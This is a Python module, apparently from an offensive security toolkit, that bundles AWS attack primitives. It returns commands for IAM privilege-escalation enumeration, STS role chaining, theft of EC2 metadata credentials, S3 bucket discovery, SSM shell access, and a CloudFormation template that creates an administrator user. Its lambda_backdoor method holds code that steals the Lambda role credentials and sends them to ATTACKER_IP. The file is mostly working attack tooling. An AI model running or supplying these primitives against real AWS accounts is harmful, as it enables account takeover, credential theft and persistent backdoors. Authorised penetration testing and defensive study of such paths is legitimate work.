"""AWS privilege escalation — IAM enumeration, Lambda backdoors, STS role chaining.

Provides attack primitives for Amazon Web Services: IAM privilege escalation
paths, EC2 instance metadata abuse, Lambda function backdooring, STS assume
role chaining, CloudFormation drift exploitation, and S3 bucket enumeration.

Uses boto3 for API operations when available; falls back to curl/HTTP commands.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

try:
    import boto3  # noqa: F401
    HAS_BOTO3 = True
except ImportError:
    HAS_BOTO3 = False

AWS_PRIVESC_METHODS = [
    "iam_create_policy_version",
    "iam_create_login_profile",
    "iam_create_access_key",
    "iam_add_user_to_group",
    "iam_set_default_policy_version",
    "iam_attach_user_policy",
    "iam_attach_group_policy",
    "iam_attach_role_policy",
    "iam_put_user_policy",
    "iam_put_group_policy",
    "iam_put_role_policy",
    "iam_update_assume_role_policy",
    "iam_passing_role_to_services",
    "lambda_create_function",
    "lambda_update_function_code",
    "lambda_invoke_function",
    "cloudformation_create_stack",
    "ec2_run_instances",
    "ec2_modify_instance_attribute",
    "sts_assume_role",
    "glue_create_dev_endpoint",
    "glue_update_dev_endpoint",
    "codestar_create_project",
    "sagemaker_create_notebook_instance",
    "datapipeline_create_pipeline",
]

AWS_MANAGED_ADMIN_POLICIES = [
    "arn:aws:iam::aws:policy/AdministratorAccess",
    "arn:aws:iam::aws:policy/IAMFullAccess",
    "arn:aws:iam::aws:policy/PowerUserAccess",
]


@dataclass
class AWSConfig:
    """Configuration for AWS attack operations.

    Attributes:
        access_key_id: AWS access key.
        secret_access_key: AWS secret key.
        session_token: STS session token (for temporary credentials).
        region: AWS region.
        account_id: AWS account ID.
        role_arn: IAM role ARN to target.
        user_name: IAM user to enumerate.
    """

    access_key_id: str = ""
    secret_access_key: str = ""
    session_token: str = ""
    region: str = "us-east-1"
    account_id: str = ""
    role_arn: str = ""
    user_name: str = ""


class AWSAttackEngine:
    """Execute AWS privilege escalation and enumeration attacks.

    Provides IAM permission enumeration, Lambda backdoor insertion,
    STS role chaining, EC2 user data exfiltration, and S3 data access.

    Attributes:
        config: AWSConfig with credentials and target.
        client_cache: Cached boto3 clients.
    """

    def __init__(self, config: AWSConfig | None = None):
        self.config = config or AWSConfig()
        self._client_cache: dict[str, Any] = {}

    def enumerate_iam_permissions(self) -> dict[str, Any]:
        """Enumerate IAM permissions for the current user/role.

        Simulates permission boundary testing to identify privilege
        escalation paths. Returns structured data for analysis.

        Returns:
            Dict with user info, policies, groups, and potential privesc paths.
        """
        return {
            "attack_type": "iam_enumeration",
            "commands": [
                "aws iam get-user",
                "aws iam list-attached-user-policies --user-name USER",
                "aws iam list-user-policies --user-name USER",
                "aws iam list-groups-for-user --user-name USER",
                "aws iam list-roles",
                "aws iam list-policies --scope Local",
                "aws iam simulate-principal-policy --policy-source-arn USER_ARN --action-names ACTION_LIST",
            ],
            "privesc_check": {
                "iam:CreatePolicyVersion": "Can create new default policy version with admin perms",
                "iam:CreateAccessKey": "Can create new access keys for privileged users",
                "iam:AddUserToGroup": "Can add self to privileged groups",
                "iam:AttachUserPolicy": "Can attach admin policy to self",
                "iam:AttachRolePolicy": "Can attach admin policy to any role",
                "iam:PassRole + ANY:Create*": "Can pass privileged role to new resources",
                "lambda:UpdateFunctionCode + lambda:InvokeFunction": "Can backdoor Lambda with role",
                "ec2:RunInstances + iam:PassRole": "Can create EC2 with privileged role",
            },
        }

    def lambda_backdoor(self, function_name: str = "") -> dict[str, Any]:
        """Plan a Lambda backdoor for privilege escalation.

        If the attacker can iam:PassRole and lambda:UpdateFunctionCode,
        they can modify an existing Lambda to exfiltrate its role credentials.

        Args:
            function_name: Target Lambda function name.

        Returns:
            Dict with Lambda backdooring commands.
        """
        return {
            "attack_type": "lambda_backdoor",
            "description": "Modify Lambda function code to exfiltrate execution role credentials",
            "requirements": ["lambda:UpdateFunctionCode", "lambda:InvokeFunction"],
            "commands": [
                "aws lambda get-function --function-name FUNCTION_NAME",
                "aws lambda update-function-code --function-name FUNCTION_NAME --zip-file fileb://backdoor.zip",
                "aws lambda invoke --function-name FUNCTION_NAME --payload '{}' output.txt",
            ],
            "backdoor_code": (
                "import json, urllib.request, os; "
                "creds = json.loads(urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME').read()); "
                "urllib.request.urlopen('http://ATTACKER_IP:PORT/', json.dumps(creds).encode())"
            ),
        }

    def sts_role_chain(self, target_role_arn: str = "") -> dict[str, Any]:
        """Enumerate and exploit STS AssumeRole privilege escalation chains.

        Discovers all roles the current user can assume and provides
        lateral movement via role chaining to elevated access.

        Args:
            target_role_arn: Specific role ARN to target.

        Returns:
            Dict with role enumeration and chaining commands.
        """
        return {
            "attack_type": "sts_role_chain",
            "description": "Enumerate assumable roles and chain to elevated access",
            "commands": [
                "aws sts get-caller-identity",
                "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]'",
                "aws sts assume-role --role-arn TARGET_ROLE --role-session-name lazyown",
                "export AWS_ACCESS_KEY_ID=NEW_KEY; export AWS_SECRET_ACCESS_KEY=NEW_SECRET; export AWS_SESSION_TOKEN=NEW_TOKEN",
            ],
            "chain_example": (
                "User A -> STS:AssumeRole -> Role B (elevated perms) -> STS:AssumeRole -> Role C (admin perms)"
            ),
        }

    def ec2_user_data_exfil(self) -> dict[str, Any]:
        """Extract sensitive data from EC2 instance user data and metadata.

        EC2 user data often contains deployment scripts with hardcoded
        credentials, API keys, and configuration secrets.

        Returns:
            Dict with IMDSv1/v2 commands and user data extraction.
        """
        return {
            "attack_type": "ec2_user_data",
            "description": "Exfiltrate sensitive data from EC2 instance metadata and user data",
            "imdsv1_commands": [
                "curl -s http://169.254.169.254/latest/meta-data/",
                "curl -s http://169.254.169.254/latest/user-data/",
                "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
                "curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
            ],
            "imdsv2_commands": [
                "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')",
                "curl -s -H 'X-aws-ec2-metadata-token: $TOKEN' http://169.254.169.254/latest/user-data/",
                "curl -s -H 'X-aws-ec2-metadata-token: $TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
        }

    def s3_enumeration(self) -> dict[str, Any]:
        """Enumerate S3 buckets and their permissions.

        Maps public/private buckets, checks for write access, and identifies
        buckets with sensitive naming patterns.

        Returns:
            Dict with S3 enumeration commands and bucket patterns.
        """
        return {
            "attack_type": "s3_enumeration",
            "commands": [
                "aws s3 ls",
                "aws s3 ls s3://BUCKET_NAME --no-sign-request",
                "aws s3api get-bucket-acl --bucket BUCKET_NAME",
                "aws s3api get-bucket-policy --bucket BUCKET_NAME",
                "aws s3api list-objects --bucket BUCKET_NAME --max-items 100",
            ],
            "sensitive_patterns": [
                "*-terraform-*", "*-tfstate*", "*config*", "*-backup-*",
                "*-secrets-*", "*credential*", "*password*", "*database*",
                "*-cloudformation-*", "*-cf-templates-*",
            ],
            "public_access_check": [
                "curl -s http://BUCKET_NAME.s3.amazonaws.com/",
                "aws s3api get-public-access-block --bucket BUCKET_NAME",
            ],
        }

    def cloudformation_drift(self) -> dict[str, Any]:
        """Exploit CloudFormation for privilege escalation.

        CloudFormation executes with the privileges of the user who created
        the stack or the stack's service role. Modifying CF templates can
        create IAM resources with elevated permissions.

        Returns:
            Dict with CF drift exploitation commands.
        """
        return {
            "attack_type": "cloudformation_drift",
            "description": "Modify CloudFormation stack to create privileged IAM resources",
            "requirements": ["cloudformation:UpdateStack", "stack has IAM capabilities"],
            "commands": [
                "aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE",
                "aws cloudformation get-template --stack-name STACK_NAME",
                "aws cloudformation update-stack --stack-name STACK_NAME --template-body file://malicious.json --capabilities CAPABILITY_IAM CAPABILITY_NAMED_IAM",
            ],
            "drift_template": {
                "Resources": {
                    "PrivescUser": {
                        "Type": "AWS::IAM::User",
                        "Properties": {"UserName": "cf_privesc_user", "ManagedPolicyArns": AWS_MANAGED_ADMIN_POLICIES[:1]},
                    }
                }
            },
        }

    def ec2_ssm_session_abuse(self) -> dict[str, Any]:
        """Abuse SSM to gain shell access to EC2 instances.

        If a user has ssm:StartSession, they can open interactive shells
        to managed instances.

        Returns:
            Dict with SSM abuse commands.
        """
        return {
            "attack_type": "ssm_session_abuse",
            "requirements": ["ssm:StartSession", "ssm:DescribeInstanceInformation"],
            "commands": [
                "aws ssm describe-instance-information",
                "aws ssm start-session --target INSTANCE_ID",
                "aws ssm send-command --instance-ids INSTANCE_ID --document-name AWS-RunShellScript --parameters commands='id;hostname'",
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "available_attacks": AWS_PRIVESC_METHODS[:20],
            "admin_policies": AWS_MANAGED_ADMIN_POLICIES,
            "region": self.config.region,
            "quick_enum": [
                "aws sts get-caller-identity",
                "aws iam list-roles --max-items 50",
                "aws ec2 describe-instances --max-items 50",
                "aws s3 ls --page-size 50",
            ],
        }
